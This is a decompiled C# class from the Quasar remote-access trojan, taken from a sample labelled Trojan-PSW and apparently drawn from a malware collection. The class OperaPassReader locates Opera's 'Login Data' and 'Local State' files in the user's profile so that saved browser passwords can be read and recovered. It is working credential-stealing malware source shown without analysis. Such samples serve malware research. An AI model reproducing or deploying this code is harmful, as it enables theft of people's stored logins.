// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Recovery.Browsers.OperaPassReader
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
  public class OperaPassReader : ChromiumBase
  {
    public override string ApplicationName => "Opera";

    public override IEnumerable<RecoveredAccount> ReadAccounts()
    {
      try
      {
        return (IEnumerable<RecoveredAccount>) this.ReadAccounts(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Login Data"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Local State"));
      }
      catch (Exception ex)
      {
        return (IEnumerable<RecoveredAccount>) new List<RecoveredAccount>();
      }
    }
  }
}
